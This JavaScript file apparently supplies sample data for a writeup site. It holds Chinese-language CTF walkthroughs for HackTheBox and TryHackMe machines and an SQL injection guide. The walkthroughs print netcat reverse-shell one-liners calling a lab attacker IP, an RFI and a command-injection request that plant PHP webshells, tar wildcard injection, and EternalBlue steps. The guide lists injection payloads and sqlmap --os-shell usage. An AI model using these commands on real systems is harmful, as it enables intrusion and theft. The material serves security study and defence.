
// 範例資料（當無法載入外部檔案時使用）
function loadExampleData() {
    writeups = [
        {
            title: "Tartarsauce - Easy Box",
            platform: "htb",
            description: "透過 WordPress 外掛漏洞獲取初始存取權限，再利用 tar 的萬用字元注入提權至 root",
            os: ["linux"],
            software: ["wordpress 4.9", "gwolle-gb 2.3.10"],
            vulns: ["CVE-2015-6668"],
            tools: ["nmap", "gobuster", "netcat"],
            date: "2024-11-10",
            file: "tartarsauce.md",
            type: "writeup",
            content: `# Tartarsauce - HackTheBox Writeup

## 機器資訊
- **難度**: Easy
- **作業系統**: Linux
- **IP**: 10.10.10.88

## 偵查階段

### Nmap 掃描
\`\`\`bash
nmap -sC -sV -oA nmap/tartarsauce 10.10.10.88
\`\`\`

發現開放的服務：
- **80/tcp**: Apache httpd 2.4.18

### 目錄列舉
使用 gobuster 進行目錄掃描：
\`\`\`bash
gobuster dir -u http://10.10.10.88 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
\`\`\`

找到 WordPress 安裝在 \`/webservices/wp/\`

## 漏洞利用

### WordPress 外掛漏洞
發現 Gwolle Guestbook 外掛版本 2.3.10，存在 RFI 漏洞 (CVE-2015-6668)

利用步驟：
1. 上傳 PHP reverse shell
2. 觸發 RFI 漏洞執行 shell
3. 獲得 www-data 權限

\`\`\`bash
curl http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.23/shell.php
\`\`\`

## 權限提升

### Tar 萬用字元注入
在 /var/backups 發現自動執行的 tar 備份腳本

利用 tar 的 checkpoint 功能執行任意指令：
\`\`\`bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.23 4444 >/tmp/f" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
\`\`\`

等待 cron job 執行後獲得 root shell！

## Flag
- **User Flag**: 3a4d************d89a
- **Root Flag**: d5b8************f6ac

## 學習重點
1. WordPress 外掛掃描與漏洞識別
2. RFI (Remote File Inclusion) 攻擊
3. Tar 萬用字元注入技巧
4. Linux 權限提升方法`
        },
        {
            title: "Blue - Windows SMB 永恆之藍",
            platform: "thm",
            description: "經典的 MS17-010 EternalBlue 漏洞利用，透過 SMB 協定的緩衝區溢位取得 SYSTEM 權限",
            os: ["windows"],
            software: ["smb 1.0"],
            vulns: ["MS17-010", "CVE-2017-0143"],
            tools: ["nmap", "metasploit", "msfvenom"],
            date: "2024-11-08",
            file: "blue.md",
            type: "writeup",
            content: `# Blue - TryHackMe Writeup

## 房間資訊
- **難度**: Easy
- **類型**: Windows 漏洞利用
- **主題**: EternalBlue (MS17-010)

## 偵查

### Nmap 掃描
\`\`\`bash
nmap -sC -sV -p- 10.10.10.40
\`\`\`

開放端口：
- 135/tcp - msrpc
- 139/tcp - netbios-ssn
- 445/tcp - microsoft-ds (SMB)
- 3389/tcp - ms-wbt-server (RDP)

### 漏洞掃描
使用 nmap 的 smb-vuln 腳本：
\`\`\`bash
nmap --script smb-vuln* -p445 10.10.10.40
\`\`\`

確認存在 **MS17-010** 漏洞！

## 漏洞利用

### Metasploit 攻擊
\`\`\`bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.40
set LHOST tun0
exploit
\`\`\`

成功獲得 SYSTEM 權限的 Meterpreter session！

### 手動利用（使用 AutoBlue-MS17-010）
\`\`\`bash
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
cd AutoBlue-MS17-010
pip install -r requirements.txt
python eternalblue_exploit7.py 10.10.10.40
\`\`\`

## 後滲透

### 獲取密碼雜湊
\`\`\`bash
hashdump
\`\`\`

### 搜尋 Flag
\`\`\`bash
search -f flag*.txt
\`\`\`

找到三個 flag：
1. C:\\flag1.txt
2. C:\\Windows\\System32\\config\\flag2.txt  
3. C:\\Users\\Jon\\Documents\\flag3.txt

## 防禦建議
1. 立即安裝 MS17-010 安全更新
2. 停用 SMBv1 協定
3. 實施網路分段
4. 設定防火牆規則限制 SMB 存取

## 參考資源
- [MS17-010 公告](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)
- [EternalBlue 技術分析](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/)`
        },
        {
            title: "OpenAdmin - SSRF to RCE",
            platform: "htb",
            description: "利用 OpenNetAdmin 18.1.1 的認證繞過漏洞，配合 SSH 私鑰洩露完成提權",
            os: ["linux"],
            software: ["opennetadmin 18.1.1", "openssh 7.6"],
            vulns: ["CVE-2019-9489"],
            tools: ["nmap", "curl", "netcat"],
            date: "2024-11-05",
            file: "openadmin.md",
            type: "writeup",
            content: `# OpenAdmin - HackTheBox Writeup

## 系統資訊
- **難度**: Easy
- **OS**: Linux (Ubuntu 18.04)
- **IP**: 10.10.10.171

## 初始掃描

\`\`\`bash
nmap -sC -sV 10.10.10.171
\`\`\`

開放服務：
- 22/tcp: OpenSSH 7.6p1
- 80/tcp: Apache httpd 2.4.29

## Web 應用程式分析

發現 OpenNetAdmin 18.1.1 安裝在 /ona/

### 漏洞識別 (CVE-2019-9489)
OpenNetAdmin 存在 RCE 漏洞，可透過 shell 命令注入

\`\`\`bash
curl -s -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"<?php system(\$_GET['cmd']);?>\" > /opt/ona/www/shell.php&xajaxargs[]=ping" "http://10.10.10.171/ona/"
\`\`\`

## 初始立足點

執行反向 shell：
\`\`\`bash
nc -lvnp 9001
curl http://10.10.10.171/ona/shell.php?cmd=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202>%261|nc%2010.10.14.23%209001%20>/tmp/f
\`\`\`

獲得 www-data shell

## 橫向移動

在資料庫設定檔找到密碼：
\`\`\`bash
cat /opt/ona/www/local/config/database_settings.inc.php
\`\`\`

使用找到的密碼 SSH 登入 jimmy 帳號

## 權限提升

發現內部 web 服務運行在 localhost:52846

main.php 包含可讀取 joanna SSH 私鑰的程式碼

使用 SSH key 登入 joanna 帳號並讀取 user flag

### Root 提權

\`\`\`bash
sudo -l
\`\`\`

發現可以用 sudo 執行 /bin/nano /opt/priv

利用 nano 的 GTFOBins：
\`\`\`
sudo /bin/nano /opt/priv
^R^X
reset; sh 1>&0 2>&0
\`\`\`

獲得 root shell！`
        },
        {
            title: "SQL Injection 完整指南",
            description: "深入理解 SQL 注入的原理、類型、攻擊手法與防禦建議。涵蓋 Union-based、Boolean-based、Time-based 等各種注入技術",
            vulns: ["SQL Injection", "CWE-89"],
            tools: ["sqlmap", "burp suite", "manual injection"],
            date: "2024-11-01",
            file: "sql-injection-guide.md",
            type: "knowledge",
            content: `# SQL Injection 完整指南

## 漏洞原理

SQL Injection（SQL 注入）是一種程式碼注入攻擊，攻擊者透過在應用程式的輸入欄位中插入惡意 SQL 語句，操縱後端資料庫執行非預期的查詢。

### 成因
- **不安全的字串拼接**：直接將使用者輸入拼接到 SQL 查詢中
- **缺乏輸入驗證**：未檢查和清理使用者輸入
- **過度信任客戶端資料**：假設來自前端的資料是安全的

## SQL 注入類型

### 1. Union-based SQL Injection
最常見的注入方式，利用 UNION 運算符合併多個查詢結果。

**範例：**
\`\`\`sql
' UNION SELECT username, password FROM users--
\`\`\`

**檢測方法：**
\`\`\`
1. 測試單引號：'
2. 測試註解：' OR 1=1--
3. 確認欄位數：' ORDER BY 1--
4. 使用 UNION 查詢：' UNION SELECT NULL,NULL--
\`\`\`

### 2. Boolean-based Blind SQL Injection
透過觀察應用程式對不同 SQL 查詢的回應差異來推斷資訊。

**範例：**
\`\`\`sql
' AND 1=1--  （正常回應）
' AND 1=2--  （錯誤回應）
' AND SUBSTRING(password,1,1)='a'--
\`\`\`

### 3. Time-based Blind SQL Injection
當應用程式對所有查詢都返回相同回應時，透過延時函數判斷注入成功。

**範例：**
\`\`\`sql
' AND SLEEP(5)--
' OR IF(1=1, SLEEP(5), 0)--
\`\`\`

### 4. Error-based SQL Injection
利用資料庫錯誤訊息洩露資訊。

**範例：**
\`\`\`sql
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)y)--
\`\`\`

## 攻擊手法

### 資料庫列舉
\`\`\`sql
-- 取得資料庫版本
' UNION SELECT @@version--

-- 列出所有資料庫
' UNION SELECT schema_name FROM information_schema.schemata--

-- 列出資料表
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--

-- 列出欄位
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
\`\`\`

### 資料外洩
\`\`\`sql
-- 取得使用者資料
' UNION SELECT username,password FROM users--

-- 讀取檔案（MySQL）
' UNION SELECT LOAD_FILE('/etc/passwd')--
\`\`\`

### 寫入檔案
\`\`\`sql
-- 寫入 webshell（需要 FILE 權限）
' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'--
\`\`\`

## 使用 SQLMap

### 基本用法
\`\`\`bash
# 檢測注入點
sqlmap -u "http://target.com/page?id=1"

# 列出資料庫
sqlmap -u "http://target.com/page?id=1" --dbs

# 列出資料表
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# 導出資料
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump

# POST 請求注入
sqlmap -u "http://target.com/login" --data="username=admin&password=pass"

# 使用 Cookie
sqlmap -u "http://target.com/page" --cookie="PHPSESSID=abc123"
\`\`\`

### 進階選項
\`\`\`bash
# 指定注入技術
sqlmap -u "http://target.com/page?id=1" --technique=BEUST

# 讀取檔案
sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd"

# 寫入檔案
sqlmap -u "http://target.com/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# OS Shell
sqlmap -u "http://target.com/page?id=1" --os-shell
\`\`\`

## 防禦措施

### 1. 使用預處理語句（Prepared Statements）
**PHP PDO：**
\`\`\`php
$stmt = $pdo->prepare('SELECT * FROM users WHERE username = ? AND password = ?');
$stmt->execute([$username, $password]);
\`\`\`

**Python：**
\`\`\`python
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))
\`\`\`

### 2. 使用 ORM（Object-Relational Mapping）
\`\`\`python
# Django ORM
User.objects.filter(username=username, password=password)
\`\`\`

### 3. 輸入驗證與清理
\`\`\`php
// 白名單驗證
$allowed_columns = ['id', 'name', 'email'];
if (!in_array($sort_column, $allowed_columns)) {
    die('Invalid column');
}
\`\`\`

### 4. 最小權限原則
- 資料庫帳號只給予必要的權限
- 避免使用 root 或 administrator 連接資料庫
- 分離讀寫權限

### 5. 錯誤處理
- 不要顯示詳細的資料庫錯誤訊息
- 使用通用錯誤頁面
- 記錄錯誤到安全的日誌檔

### 6. Web Application Firewall (WAF)
- 部署 WAF 偵測和阻擋 SQL 注入攻擊
- 使用 ModSecurity 等開源方案

## 檢測工具

1. **SQLMap** - 自動化 SQL 注入工具
2. **Burp Suite** - 攔截和修改請求
3. **OWASP ZAP** - 漏洞掃描器
4. **NoSQLMap** - NoSQL 資料庫注入工具
5. **jSQL Injection** - 圖形化 SQL 注入工具

## 參考資源
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)`
        }
    ];
}